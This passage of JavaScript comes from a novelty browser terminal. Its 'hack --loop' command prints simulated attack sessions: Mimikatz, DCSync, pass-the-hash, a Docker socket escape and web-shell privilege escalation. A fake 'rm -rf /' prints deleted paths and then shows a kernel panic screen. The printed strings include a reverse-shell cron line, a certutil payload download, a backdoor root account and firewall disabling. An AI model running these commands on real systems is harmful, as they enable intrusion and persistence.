                const pw = words[rnd(0,words.length-1)] + rnd(10,9999);
                yield [400, 'ansi-fg-green ansi-bold',  `${domain}\\${uname}:${pw}`];
                yield [200, 'ansi-fg-green',            `Session..........: hashcat — Status: Cracked`];
                yield [300, 'ansi-fg-cyan',             `crackmapexec smb ${victim} -u ${uname} -p '${pw}'`];
                yield [500, 'ansi-fg-green ansi-bold',  `SMB    ${victim}   445   ${hosts[rnd(0,hosts.length-1)]}   [+] ${domain}\\${uname}:${pw} (Pwn3d!)`];
            },

            /* ── CrackMapExec + DCSync Active Directory ── */
            async function*(t) {
                const subnet  = `10.${rnd(0,5)}.${rnd(0,5)}`;
                const dc_ip   = `${subnet}.10`;
                const dom     = domains[rnd(0, domains.length-1)];
                const fqdn    = `${dom}.LOCAL`;
                const uname   = users[rnd(0, users.length-1)];
                const pw      = words[rnd(0,words.length-1)] + rnd(0,9999);
                const share_list = ['ADMIN$','C$','IPC$','NETLOGON','SYSVOL','Data','IT_Backup','Confidential'].slice(0, rnd(5,8));
                yield [0,   'ansi-fg-cyan ansi-bold',  `crackmapexec smb ${subnet}.0/24 --gen-relay-list targets.txt`];
                yield [300, 'ansi-fg-yellow',          `SMB   ${dc_ip}   445  DC01   [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:${fqdn}) (signing:True)`];
                for (let i = 0; i < rnd(3,6); i++) {
                    const h = hosts[rnd(0,hosts.length-1)];
                    yield [120, 'ansi-fg-bright-white', `SMB   ${subnet}.${rnd(11,250)}  445  ${h.padEnd(8)}  [*] Windows 10 Build 19041 x64 (name:${h}) (domain:${fqdn}) (signing:False) ← RELAY TARGET`];
                }
                yield [400, 'ansi-fg-cyan',            `crackmapexec smb ${subnet}.0/24 -u ${uname} -p '${pw}' --continue-on-success`];
                for (let i = 0; i < rnd(3,5); i++) {
                    yield [200, 'ansi-fg-dim',          `SMB   ${subnet}.${rnd(11,250)}  445  ${hosts[rnd(0,hosts.length-1)].padEnd(8)}  [-] ${dom}\\${uname}:${pw} STATUS_LOGON_FAILURE`];
                }
                yield [300, 'ansi-fg-green ansi-bold',  `SMB   ${dc_ip}   445  DC01      [+] ${fqdn}\\${uname}:${pw} (Pwn3d!)`];
                yield [200, 'ansi-fg-cyan',             `crackmapexec smb ${dc_ip} -u ${uname} -p '${pw}' --shares`];
                for (const s of share_list) {
                    const rw = ['READ','READ,WRITE','NO ACCESS'][rnd(0,2)];
                    yield [100, 'ansi-fg-bright-white', `SMB   ${dc_ip}   445  DC01   ${s.padEnd(14)} ${rw}`];
                }
                yield [400, 'ansi-fg-cyan',            `secretsdump.py ${dom}/${uname}:'${pw}'@${dc_ip} -just-dc-ntlm`];
                yield [300, 'ansi-fg-yellow',          `[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)`];
                yield [200, 'ansi-fg-yellow',          `[*] Using the DRSUAPI method to get NTDS.DIT secrets`];
                yield [200, 'ansi-fg-green ansi-bold', `${dom}.LOCAL\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:${hashes()}:::`];
                const svcs = ['krbtgt','svc_backup','svc_sql','svc_exchange'];
                for (const u of [...users.slice(0,rnd(4,7)), ...svcs.slice(0,rnd(1,3))]) {
                    yield [100, 'ansi-fg-bright-white', `${dom}.LOCAL\\${u}:${rnd(500,5000)}:aad3b435b51404eeaad3b435b51404ee:${hashes()}:::`];
                }
                yield [300, 'ansi-fg-green ansi-bold', `[*] ${rnd(15,40)} accounts dumped — Kerberos keys extracted`];
                yield [200, 'ansi-fg-yellow',          `[*] Cleaning up...`];
            },

            /* ── Mimikatz lsass dump + DCSync ── */
            async function*(t) {
                const dom   = domains[rnd(0, domains.length-1)];
                const uname = users[rnd(0, users.length-1)];
                const dc    = `DC01.${dom}.LOCAL`;
                yield [0,   'ansi-fg-cyan ansi-bold',  `mimikatz.exe`];
                yield [200, 'ansi-fg-yellow ansi-bold', `  .#####.   mimikatz 2.2.0 (x64) #19041 Sep  5 2024 19:07:44`];
                yield [100, 'ansi-fg-yellow ansi-bold', ` .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)`];
                yield [100, 'ansi-fg-yellow ansi-bold', ` ## / \\ ##  /*** Benjamin DELPY \`gentilkiwi\``];
                yield [100, 'ansi-fg-yellow ansi-bold', ` ## \\ / ##       > https://blog.gentilkiwi.com/mimikatz`];
                yield [100, 'ansi-fg-yellow ansi-bold', ` '## v ##'`];
                yield [100, 'ansi-fg-yellow ansi-bold', `  '#####'`];
                yield [200, 'ansi-fg-bright-white',    `mimikatz # privilege::debug`];
                yield [300, 'ansi-fg-green',           `Privilege '20' OK`];
                yield [200, 'ansi-fg-bright-white',    `mimikatz # token::elevate`];
                yield [300, 'ansi-fg-green',           `Token Id  : 0`];
                yield [100, 'ansi-fg-green',           `User name :`];
                yield [100, 'ansi-fg-green',           `SID name  : NT AUTHORITY\\SYSTEM`];
                yield [200, 'ansi-fg-bright-white',    `mimikatz # sekurlsa::logonpasswords`];
                for (let i = 0; i < rnd(2,4); i++) {
                    const u2 = users[rnd(0,users.length-1)];
                    yield [300, 'ansi-fg-yellow',      `Authentication Id : 0 ; ${rnd(100000,999999)} (00000000:${hashes().slice(0,8)})`];
                    yield [100, 'ansi-fg-yellow',      `Session           : Interactive from ${rnd(1,3)}`];
                    yield [100, 'ansi-fg-yellow',      `User Name         : ${u2}`];
                    yield [100, 'ansi-fg-yellow',      `Domain            : ${dom}`];
                    yield [100, 'ansi-fg-yellow',      `Logon Server      : DC01`];
                    yield [100, 'ansi-fg-yellow',      `SID               : ${sid()}`];
                    yield [150, 'ansi-fg-bright-white', `         * Username : ${u2}`];
                    yield [100, 'ansi-fg-bright-white', `         * Domain   : ${dom}`];
                    yield [100, 'ansi-fg-green ansi-bold', `         * NTLM     : ${hashes()}`];
                    yield [100, 'ansi-fg-green ansi-bold', `         * SHA1     : ${sha1()}`];
                    const cleartext = rnd(0,2) === 0 ? words[rnd(0,words.length-1)] + rnd(0,9999) : null;
                    if (cleartext) yield [100, 'ansi-fg-red ansi-bold', `         * Password : ${cleartext}`];
                }
                yield [300, 'ansi-fg-bright-white',    `mimikatz # lsadump::dcsync /domain:${dom}.LOCAL /user:krbtgt`];
                yield [400, 'ansi-fg-yellow',          `[DC] '${dc}' will be the domain`];
                yield [200, 'ansi-fg-yellow',          `[DC] 'DC01.${dom}.LOCAL' will be the DC server`];
                yield [300, 'ansi-fg-green ansi-bold', `Object RDN           : krbtgt`];
                yield [100, 'ansi-fg-bright-white',    `SAM Username         : krbtgt`];
                yield [100, 'ansi-fg-bright-white',    `Account Type         : 30000000 ( USER_OBJECT )`];
                yield [100, 'ansi-fg-red ansi-bold',   `Hash NTLM: ${hashes()}`];
                yield [100, 'ansi-fg-bright-white',    `  ntlm- 0: ${hashes()}`];
                yield [100, 'ansi-fg-bright-white',    `  lm  - 0: ${hashes()}`];
                yield [300, 'ansi-fg-red ansi-bold',   `[*] krbtgt hash obtained — Golden Ticket attack possible`];
                yield [200, 'ansi-fg-cyan',            `mimikatz # kerberos::golden /user:Administrator /domain:${dom}.LOCAL /sid:${sid()} /krbtgt:${hashes()} /ptt`];
                yield [500, 'ansi-fg-green ansi-bold', `[*] Golden Ticket forged — injected into current session`];
            },

            /* ── Docker socket escape ── */
            async function*(t) {
                const cid = hashes().slice(0,12);
                const h_ip = intip();
                yield [0,   'ansi-fg-cyan ansi-bold',  `www-data@${cid}:/app$ cat /proc/1/cgroup`];
                yield [200, 'ansi-fg-bright-white',    `12:memory:/docker/${cid}${hashes().slice(0,52)}`];
                yield [100, 'ansi-fg-bright-white',    `11:cpu,cpuacct:/docker/${cid}${hashes().slice(0,52)}`];
                yield [100, 'ansi-fg-bright-white',    ` 1:name=systemd:/docker/${cid}${hashes().slice(0,52)}`];
                yield [300, 'ansi-fg-yellow ansi-bold', `# Running inside container — checking escape vectors`];
                yield [200, 'ansi-fg-cyan',            `www-data@${cid}:/app$ ls -la /var/run/docker.sock 2>/dev/null`];
                yield [400, 'ansi-fg-green ansi-bold', `srw-rw---- 1 root docker 0 Jan 15 03:22 /var/run/docker.sock`];
                yield [200, 'ansi-fg-red ansi-bold',   `# Docker socket mounted — container escape possible!`];
                yield [300, 'ansi-fg-cyan',            `www-data@${cid}:/app$ docker -H unix:///var/run/docker.sock images`];
                yield [300, 'ansi-fg-bright-white',    `REPOSITORY   TAG       IMAGE ID       CREATED        SIZE`];
                yield [100, 'ansi-fg-bright-white',    `ubuntu       22.04     c995b57d5c4c   2 weeks ago    77.8MB`];
                yield [100, 'ansi-fg-bright-white',    `nginx        latest    61395b4c586d   3 weeks ago    192MB`];
                yield [100, 'ansi-fg-bright-white',    `alpine       3.19      c1aabb73d233   3 weeks ago    7.33MB`];
                yield [400, 'ansi-fg-cyan',            `www-data@${cid}:/app$ docker -H unix:///var/run/docker.sock run -it --rm --privileged -v /:/host alpine chroot /host sh`];
                yield [600, 'ansi-fg-yellow',          `[*] Spawning privileged container, mounting host / → /host...`];
                yield [400, 'ansi-fg-green ansi-bold', `# id`];
                yield [300, 'ansi-fg-green ansi-bold', `uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon)`];
                yield [200, 'ansi-fg-cyan',            `# hostname`];
                yield [200, 'ansi-fg-bright-white',    `${h_ip.replace(/\./g,'-')}`];
                yield [200, 'ansi-fg-cyan',            `# cat /etc/shadow | head -4`];
                for (let i = 0; i < rnd(3,5); i++) {
                    yield [150, 'ansi-fg-bright-white', `${users[i]}:$6$rounds=65536$${hashes()}$${hashes()}${hashes()}:19800:0:99999:7:::`];
                }
                yield [300, 'ansi-fg-cyan',            `# echo '* * * * * root bash -i >& /dev/tcp/${ip()}/4444 0>&1' >> /etc/crontab`];
                yield [400, 'ansi-fg-green ansi-bold', `[*] Reverse shell cron persistence written to host /etc/crontab`];
                yield [300, 'ansi-fg-cyan',            `# useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor`];
                yield [300, 'ansi-fg-cyan',            `# echo 'backdoor:${words[rnd(0,words.length-1)]}${rnd(100,9999)}' | chpasswd`];
                yield [300, 'ansi-fg-green ansi-bold', `[*] Backdoor root account created`];
            },

            /* ── Impacket psexec pass-the-hash ── */
            async function*(t) {
                const tgt   = intip();
                const admin_hash = hashes();
                const dom   = domains[rnd(0, domains.length-1)];
                const svc   = hashes().slice(0,8).toUpperCase();
                yield [0,   'ansi-fg-cyan ansi-bold',  `psexec.py -hashes :${admin_hash} Administrator@${tgt}`];
                yield [300, 'ansi-fg-yellow ansi-bold', `Impacket v0.12.0 - Copyright 2023 Fortra`];
                yield [400, 'ansi-fg-yellow',          `[*] Requesting shares on ${tgt}....`];
                yield [400, 'ansi-fg-yellow',          `[*] Found writable share ADMIN$`];
                yield [300, 'ansi-fg-yellow',          `[*] Uploading file ${svc}.exe`];
                yield [300, 'ansi-fg-yellow',          `[*] Opening SVCManager on ${tgt}....`];
                yield [300, 'ansi-fg-yellow',          `[*] Creating service ${svc} on ${tgt}....`];
                yield [500, 'ansi-fg-yellow',          `[*] Starting service ${svc}.....`];
                yield [400, 'ansi-fg-green ansi-bold', `[!] Press help for extra shell commands`];
                yield [200, 'ansi-fg-bright-white',    `Microsoft Windows [Version 10.0.19041.1415]`];
                yield [100, 'ansi-fg-bright-white',    `(c) Microsoft Corporation. All rights reserved.`];
                yield [300, 'ansi-fg-green',           `C:\\Windows\\system32> whoami`];
                yield [300, 'ansi-fg-bright-white',    `nt authority\\system`];
                yield [200, 'ansi-fg-green',           `C:\\Windows\\system32> ipconfig /all`];
                yield [200, 'ansi-fg-bright-white',    `Windows IP Configuration — Host Name: ${hosts[rnd(0,hosts.length-1)]}`];
                yield [100, 'ansi-fg-bright-white',    `   IPv4 Address: ${tgt}`];
                yield [100, 'ansi-fg-bright-white',    `   Subnet Mask : 255.255.255.0`];
                yield [300, 'ansi-fg-green',           `C:\\Windows\\system32> net user /domain`];
                yield [300, 'ansi-fg-bright-white',    `User accounts for \\\\DC01.${dom}.LOCAL`];
                yield [100, 'ansi-fg-dim',             `-------------------------------------------------------------------------------`];
                const du = [...users, 'svc_backup','svc_sql','helpdesk','itadmin'];
                for (let i = 0; i < Math.ceil(du.length/3); i++) {
                    yield [80, 'ansi-fg-green',        du.slice(i*3, i*3+3).join('             ')];
                }
                yield [300, 'ansi-fg-green',           `C:\\Windows\\system32> reg query HKLM\\SAM /s`];
                yield [400, 'ansi-fg-yellow',          `[*] Extracting SAM hive...`];
                yield [300, 'ansi-fg-green ansi-bold', `Administrator    0x1  0x0  ${hashes()}`];
                yield [100, 'ansi-fg-bright-white',    `Guest            0x1  0x0  aad3b435b51404eeaad3b435b51404ee`];
                yield [300, 'ansi-fg-green',           `C:\\Windows\\system32> netsh advfirewall set allprofiles state off`];
                yield [300, 'ansi-fg-green ansi-bold', `Ok.`];
                yield [300, 'ansi-fg-green',           `C:\\Windows\\system32> certutil -urlcache -split -f http://${ip()}/beacon.exe C:\\Windows\\Temp\\svchost32.exe`];
                yield [400, 'ansi-fg-yellow',          `****  Online  ****`];
                yield [100, 'ansi-fg-yellow',          `CertUtil: -URLCache command completed successfully.`];
                yield [300, 'ansi-fg-cyan',            `C:\\Windows\\system32> sc create "WindowsUpdate32" binpath="C:\\Windows\\Temp\\svchost32.exe" start=auto`];
                yield [300, 'ansi-fg-green ansi-bold', `[SERVICE_NAME: WindowsUpdate32] — Persistence established`];
            },

            /* ── Web shell upload + SUID escalation ── */
            async function*(t) {
                const tgt = `http://${ip()}`;
                const port = [80,8080,8000,443][rnd(0,3)];
                yield [0,   'ansi-fg-cyan ansi-bold',  `ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u ${tgt}/FUZZ -mc 200,301,302,403`];
                yield [300, 'ansi-fg-yellow ansi-bold', `        /'___\\  /'___\\           /'___\\`];
                yield [100, 'ansi-fg-yellow ansi-bold', `       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/`];
                yield [100, 'ansi-fg-yellow ansi-bold', `       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\`];
                yield [100, 'ansi-fg-yellow',           `       ffuf v2.1.0 — Fuzz Faster U Fool`];
                const ffuf_dirs = ['/admin','/uploads','/backup','/config','/api','/dev','/test','/images','/assets'];
                for (const d of ffuf_dirs.sort(()=>Math.random()-0.5).slice(0, rnd(3,6))) {
                    const status = [200,200,301,403][rnd(0,3)];
                    yield [rnd(80,200), status===200?'ansi-fg-green':status===403?'ansi-fg-yellow':'ansi-fg-cyan',
                        `${d.padEnd(24)} [Status: ${status}, Size: ${rnd(800,50000)}, Words: ${rnd(10,500)}, Lines: ${rnd(5,200)}]`];
                }
                yield [300, 'ansi-fg-cyan',            `curl -s -X POST ${tgt}/uploads/ -F "file=@test.jpg;type=image/jpeg" --data-binary @shell.php.jpg`];
                yield [400, 'ansi-fg-dim',             `HTTP/1.1 200 OK — {"status":"success","path":"/uploads/shell.php.jpg"}`];
                yield [300, 'ansi-fg-yellow',          `# Trying null byte bypass...`];
                yield [200, 'ansi-fg-cyan',            `curl -s "${tgt}/uploads/shell.php.jpg%00.jpg?cmd=id"`];
                yield [400, 'ansi-fg-green ansi-bold', `uid=33(www-data) gid=33(www-data) groups=33(www-data)`];
                yield [300, 'ansi-fg-cyan',            `# Enumerating SUID binaries...`];
                yield [200, 'ansi-fg-cyan',            `curl -s "${tgt}/uploads/shell.php.jpg%00.jpg?cmd=find+/usr/bin+-perm+-4000+2>/dev/null"`];
                yield [300, 'ansi-fg-bright-white',    ` /usr/bin/newgrp`];
                yield [100, 'ansi-fg-bright-white',    ` /usr/bin/gpasswd`];
                yield [100, 'ansi-fg-red ansi-bold',   ` /usr/bin/python3.11`];
                yield [200, 'ansi-fg-yellow ansi-bold',`# python3 SUID — instant root via os.setuid(0)`];
                yield [300, 'ansi-fg-cyan',            `curl -s "${tgt}/uploads/shell.php.jpg%00.jpg?cmd=python3.11+-c+'import+os;os.setuid(0);os.system(chr(105)+chr(100))'"`];
                yield [400, 'ansi-fg-green ansi-bold', `uid=0(root) gid=0(root) groups=0(root)`];
                yield [300, 'ansi-fg-cyan',            `# Grabbing flags...`];
                yield [200, 'ansi-fg-cyan',            `curl -s "${tgt}/uploads/shell.php.jpg%00.jpg?cmd=cat+/root/root.txt"`];
                yield [300, 'ansi-fg-bright-white',    `flag{${hashes()}}`];
                yield [200, 'ansi-fg-cyan',            `curl -s "${tgt}/uploads/shell.php.jpg%00.jpg?cmd=cat+/home/user/user.txt"`];
                yield [300, 'ansi-fg-bright-white',    `flag{${hashes()}}`];
            },

            /* ── theHarvester OSINT recon ── */
            async function*(t) {
                const dom = extdoms[rnd(0, extdoms.length-1)];
                const emails = Array.from({length: rnd(9,16)}, () =>
                    `${fnames[rnd(0,fnames.length-1)]}.${lnames[rnd(0,lnames.length-1)]}@${dom}`);
                yield [0,   'ansi-fg-cyan ansi-bold',  `theHarvester -d ${dom} -b all -l 500`];
                yield [200, 'ansi-fg-yellow ansi-bold', `*************************************************************`];
                yield [100, 'ansi-fg-yellow ansi-bold', `*  _   _                                _           _     *`];
                yield [100, 'ansi-fg-yellow ansi-bold', `* | |_| |__   ___    /\\  /\\__ _ _ ____  ___  ___| |_ ___ *`];
                yield [100, 'ansi-fg-yellow ansi-bold', `*************************************************************`];
                yield [200, 'ansi-fg-yellow',           `theHarvester 4.6.0  |  Passive recon tool`];
                yield [300, 'ansi-fg-yellow',           `[*] Target: ${dom}`];
                yield [400, 'ansi-fg-yellow',           `[*] Searching Google...`];
                yield [300, 'ansi-fg-yellow',           `[*] Searching Bing...`];
                yield [300, 'ansi-fg-yellow',           `[*] Searching LinkedIn...`];
                yield [300, 'ansi-fg-yellow',           `[*] Searching Shodan...`];
                yield [400, 'ansi-fg-green ansi-bold',  `[*] Emails found: ${emails.length}`];
                for (const e of emails) yield [rnd(70,180), 'ansi-fg-bright-white', `  ${e}`];
                yield [300, 'ansi-fg-yellow',           `[*] Generating username patterns from emails...`];
                for (const e of emails.slice(0, rnd(4,7))) {
                    const [fn, ln] = e.split('@')[0].split('.');
                    yield [90, 'ansi-fg-green',         `  ${fn}${ln} | ${fn[0]}${ln} | ${fn}_${ln} | ${fn}.${ln}`];
                }
                const ips = Array.from({length: rnd(4,8)}, () => ip());
                yield [400, 'ansi-fg-green ansi-bold',  `[*] Hosts/IPs found: ${ips.length}`];
                const svcs = ['Apache httpd 2.4','OpenSSH 8.9','nginx/1.24.0','Exim smtpd','Dovecot imapd','Postfix','vsftpd 3.0'];
                for (const h of ips) {
                    yield [rnd(100,250), 'ansi-fg-bright-white', `  ${h}:${[22,80,443,25,21][rnd(0,4)]} — ${svcs[rnd(0,svcs.length-1)]}`];
                }
                const subs = ['dev','staging','vpn','mail','remote','jenkins','git','jira','grafana','kibana'];
                yield [300, 'ansi-fg-yellow',           `[*] Running amass enum -d ${dom}...`];
                const found_subs = subs.sort(()=>Math.random()-0.5).slice(0,rnd(5,9));
                for (const s of found_subs) {
                    yield [rnd(120,350), 'ansi-fg-green', `  ${s}.${dom} [${ip()}]`];
                }
                yield [400, 'ansi-fg-cyan',             `whatweb -a 3 https://mail.${dom}`];
                yield [400, 'ansi-fg-bright-white',     `https://mail.${dom} [200 OK] Outlook-Web-App[15.0.1497], Title[Outlook Web App], X-Frame-Options[SAMEORIGIN]`];
                yield [300, 'ansi-fg-yellow ansi-bold', `# OWA found — password spraying target identified`];
            },

            /* ── SSH tunneling + proxychains pivot ── */
            async function*(t) {
                const ext   = ip();
                const int_a = intip();
                const int_b = intip();
                const uname = users[rnd(0, users.length-1)];
                yield [0,   'ansi-fg-cyan ansi-bold',  `# Initial foothold: ${ext} (DMZ)`];
                yield [300, 'ansi-fg-cyan',            `ssh -D 1080 -fNq -o StrictHostKeyChecking=no ${uname}@${ext}`];
                yield [500, 'ansi-fg-green',           `[*] SOCKS5 proxy established on 127.0.0.1:1080`];
                yield [200, 'ansi-fg-cyan',            `echo 'socks5  127.0.0.1  1080' >> /etc/proxychains4.conf`];
                yield [300, 'ansi-fg-cyan',            `proxychains4 -q nmap -sT -Pn -n --top-ports 200 10.10.0.0/24 2>/dev/null`];
                yield [400, 'ansi-fg-yellow',          `[proxychains] config found: /etc/proxychains4.conf`];
                yield [200, 'ansi-fg-yellow',          `[proxychains] Dynamic chain → 127.0.0.1:1080 → ${int_a} → OK`];
                yield [200, 'ansi-fg-bright-white',    `Nmap report for ${int_a} — 22/tcp open, 80/tcp open, 3306/tcp open`];
                yield [150, 'ansi-fg-bright-white',    `Nmap report for ${int_b} — 22/tcp open, 445/tcp open, 5432/tcp open`];
                yield [400, 'ansi-fg-cyan',            `proxychains4 -q ssh -L 33060:127.0.0.1:3306 ${uname}@${int_a}`];
                yield [400, 'ansi-fg-green',           `[*] Local forward active: 127.0.0.1:33060 → ${int_a}:3306`];
                yield [300, 'ansi-fg-cyan',            `mysql -u root -p -h 127.0.0.1 -P 33060`];
                yield [300, 'ansi-fg-yellow',          `Enter password:`];
                yield [400, 'ansi-fg-green ansi-bold', `Welcome to the MySQL monitor.  Commands end with ; or \\g.`];
                yield [200, 'ansi-fg-cyan',            `mysql> show databases;`];
                for (const db of ['information_schema','mysql','performance_schema','customers_prod','auth_db','sessions'].slice(0,rnd(4,6))) {
                    yield [80,  'ansi-fg-bright-white', `  | ${db}`];
                }
                yield [300, 'ansi-fg-cyan',            `mysql> select user,authentication_string from mysql.user;`];
                for (let i = 0; i < rnd(3,5); i++) {
                    yield [100, 'ansi-fg-bright-white', `  | ${users[rnd(0,users.length-1)].padEnd(12)} | $A$005$${hashes()} |`];
                }
                yield [400, 'ansi-fg-cyan',            `mysql> select concat(first_name,' ',last_name,':',email,':',password_hash) from customers_prod.accounts limit 5;`];
                for (let i = 0; i < rnd(3,5); i++) {
                    const fn = fnames[rnd(0,fnames.length-1)];
                    const ln = lnames[rnd(0,lnames.length-1)];
                    yield [120, 'ansi-fg-bright-white', `  ${fn} ${ln}:${fn}.${ln}@gmail.com:${hashes()}`];
                }
                yield [400, 'ansi-fg-cyan',            `# Pivoting deeper — adding hop to ${int_b}`];
                yield [200, 'ansi-fg-cyan',            `ssh -o ProxyJump=${uname}@${ext} -L 44550:${int_b}:445 ${uname}@${int_a}`];
                yield [400, 'ansi-fg-green',           `[*] Double hop established → ${ext} → ${int_a} → ${int_b}:445`];
                yield [300, 'ansi-fg-cyan',            `crackmapexec smb 127.0.0.1 -p 44550 -u Administrator -H ${hashes()}`];
                yield [500, 'ansi-fg-green ansi-bold', `SMB    127.0.0.1  44550  ${hosts[rnd(0,hosts.length-1)]}  [+] Administrator:${hashes().slice(0,8)} (Pwn3d!)`];
            },
        ];

        ctx.term.println(c('hack --loop engaged. Press Ctrl+C to disconnect.', 'ansi-fg-cyan ansi-bold'));
        await delay(600, ctx.signal);

        let i = 0;
        while (true) {
            const scenario = scenarios[i % scenarios.length];
            i += Math.random() < 0.5 ? 1 : rnd(1, scenarios.length - 1);

            ctx.term.println(c('', 'ansi-fg-dim'));
            ctx.term.println(c('─'.repeat(60), 'ansi-fg-dim'));

            for await (const [wait, cls, text] of scenario()) {
                await delay(wait, ctx.signal);
                ctx.term.println(c(text, cls));
            }

            await delay(rnd(800, 1500), ctx.signal);
        }
    }

    /* ── sudo rm -rf / ── */
    async function rmRf(ctx) {
        const paths = [
            '/bin/bash','/bin/ls','/bin/cat','/bin/grep','/etc/passwd','/etc/shadow',
            '/etc/hostname','/etc/hosts','/usr/bin/python3','/usr/bin/node',
            '/usr/lib/systemd/systemd','/lib/x86_64-linux-gnu/libc.so.6',
            '/lib/x86_64-linux-gnu/libm.so.6','/var/log/syslog','/home/user/.bashrc',
            '/home/user/Documents','/home/user/Downloads','/tmp','/root','/boot/vmlinuz',
            '/sbin/init','/usr/bin/vim','/var/www/html',
        ];
        ctx.term.println(c('rm: descending into filesystem...', 'ansi-fg-red'));
        await delay(300, ctx.signal);
        for (const p of paths) {
            await delay(80, ctx.signal);
            ctx.term.println(c(`removed '${p}'`, 'ansi-fg-red'));
        }
        await delay(200, ctx.signal);

        // Kernel panic sequence
        const base = 892.441293;
        const kp = [
            `[${(base+0.000001).toFixed(6)}] BUG: kernel NULL pointer dereference, address: 0000000000000000`,
            `[${(base+0.000002).toFixed(6)}] #PF: supervisor read access in kernel mode`,
            `[${(base+0.000003).toFixed(6)}] #PF: error_code(0x0000) - not-present page`,
            `[${(base+0.000004).toFixed(6)}] Oops: 0000 [#1] PREEMPT SMP NOPTI`,
            `[${(base+0.000005).toFixed(6)}] CPU: 0 PID: 1 Comm: init Not tainted 6.6.0-synth-district #1`,
            `[${(base+0.000006).toFixed(6)}] Hardware name: Synth Systems Inc. Synth District, BIOS 2.3.1 01/15/2024`,
            `[${(base+0.000007).toFixed(6)}] RIP: 0010:vfs_unlink+0x0/0x120`,
            `[${(base+0.000008).toFixed(6)}] Code: 00 00 48 8b 07 48 85 c0 74 2a 48 8b 40 28 48 85 c0 74 21 4c 8b 00 45`,
            `[${(base+0.000009).toFixed(6)}] RSP: 0018:ffffc90000013e48 EFLAGS: 00010246`,
            `[${(base+0.000010).toFixed(6)}] RAX: 0000000000000000 RBX: ffff888100250000 RCX: 0000000000000000`,
            `[${(base+0.000011).toFixed(6)}] RDX: 0000000000000000 RSI: 00000000ffffffff RDI: ffff888100250000`,
            `[${(base+0.000012).toFixed(6)}] Call Trace:`,
            `[${(base+0.000013).toFixed(6)}]  <TASK>`,
            `[${(base+0.000014).toFixed(6)}]  do_unlinkat+0x195/0x2a0`,
            `[${(base+0.000015).toFixed(6)}]  __x64_sys_unlinkat+0x1c/0x20`,
            `[${(base+0.000016).toFixed(6)}]  do_syscall_64+0x5b/0x1a0`,
            `[${(base+0.000017).toFixed(6)}]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8`,
            `[${(base+0.000018).toFixed(6)}]  </TASK>`,
            `[${(base+0.000019).toFixed(6)}] Kernel panic - not syncing: Attempted to kill init! exitcode=0x0000000b`,
            `[${(base+0.000020).toFixed(6)}] CPU: 0 PID: 1 Comm: init Not tainted 6.6.0-synth-district #1`,
            `[${(base+0.000021).toFixed(6)}] Call Trace:`,
            `[${(base+0.000022).toFixed(6)}]  <TASK>`,
            `[${(base+0.000023).toFixed(6)}]  dump_stack_lvl+0x37/0x50`,
            `[${(base+0.000024).toFixed(6)}]  panic+0x102/0x2d0`,
            `[${(base+0.000025).toFixed(6)}]  do_exit.cold+0x15/0x15`,
            `[${(base+0.000026).toFixed(6)}]  do_group_exit+0x2a/0x90`,
            `[${(base+0.000027).toFixed(6)}]  get_signal+0x8b4/0x940`,
            `[${(base+0.000028).toFixed(6)}]  arch_do_signal_or_restart+0x25/0x160`,
            `[${(base+0.000029).toFixed(6)}]  irqentry_exit_to_user_mode+0x5/0x30`,
            `[${(base+0.000030).toFixed(6)}]  irqentry_exit+0x19/0x40`,
            `[${(base+0.000031).toFixed(6)}]  exc_page_fault+0x74/0x170`,
            `[${(base+0.000032).toFixed(6)}]  asm_exc_page_fault+0x22/0x30`,
            `[${(base+0.000033).toFixed(6)}]  </TASK>`,
            `[${(base+0.000034).toFixed(6)}] ---[ end Kernel panic - not syncing: Attempted to kill init! ]---`,
        ];

        for (const line of kp) {
            await delay(40, ctx.signal);
            ctx.term.println(c(line, 'ansi-fg-bright-white'));
        }

        await delay(600, ctx.signal);
        await kernelPanicScreen();
        return { exitCode: 0 };
    }

    function kernelPanicScreen() {
        return new Promise(resolve => {
            const overlay = document.createElement('div');
            overlay.style.cssText = [
                'position:fixed', 'inset:0', 'background:#000', 'z-index:3000',
                'font-family:var(--font)', 'font-size:14px', 'color:#ccc',
                'padding:48px 60px', 'overflow:hidden', 'cursor:default',
                'white-space:pre-wrap', 'word-break:break-all',
            ].join(';');

            const panicText = [
                'Kernel panic — not syncing: Attempted to kill init! exitcode=0x0000000b',
                '',
                'CPU: 0 PID: 1 Comm: init Not tainted 6.6.0-synth-district #1',
                'Hardware name: Synth Systems Inc. Synth District, BIOS 2.3.1 01/15/2024',
                '',
                '---[ end Kernel panic - not syncing: Attempted to kill init! ]---',
                '',
                '',
                'System is halted.',
                '',
                '',
                'Press any key to reboot...',
            ].join('\n');

            overlay.textContent = panicText;

            // Blinking cursor on last line
            const blink = document.createElement('span');
            blink.style.cssText = 'display:inline-block;width:0.6em;height:1em;background:#ccc;vertical-align:text-bottom;animation:blink 1.06s step-start infinite;';
            overlay.appendChild(blink);

            document.body.appendChild(overlay);

            setTimeout(() => {
                document.addEventListener('keydown', () => {
                    overlay.remove();
                    resolve();
                    location.reload();
                }, { once: true });
            }, 800);
        });
    }

    /* ── neofetch ── */
    async function neofetch(ctx) {
        const elapsed = Math.floor((Date.now() - (SD._bootTime || Date.now())) / 1000) + 3600;
        const uptimeStr = `${Math.floor(elapsed/3600)}h ${Math.floor((elapsed%3600)/60)}m`;
        const logo = [
            ' ███████╗██╗   ██╗███╗   ██╗████████╗██╗  ██╗',
            ' ██╔════╝╚██╗ ██╔╝████╗  ██║╚══██╔══╝██║  ██║',
            ' ███████╗ ╚████╔╝ ██╔██╗ ██║   ██║   ███████║',
            ' ╚════██║  ╚██╔╝  ██║╚██╗██║   ██║   ██╔══██║',
            ' ███████║   ██║   ██║ ╚████║   ██║   ██║  ██║',
            ' ╚══════╝   ╚═╝   ╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝',
            '',
            ' ██████╗ ██╗███████╗████████╗██████╗ ██╗ ██████╗████████╗',
            ' ██╔══██╗██║██╔════╝╚══██╔══╝██╔══██╗██║██╔════╝╚══██╔══╝',
            ' ██║  ██║██║███████╗   ██║   ██████╔╝██║██║        ██║   ',
            ' ██║  ██║██║╚════██║   ██║   ██╔══██╗██║██║        ██║   ',
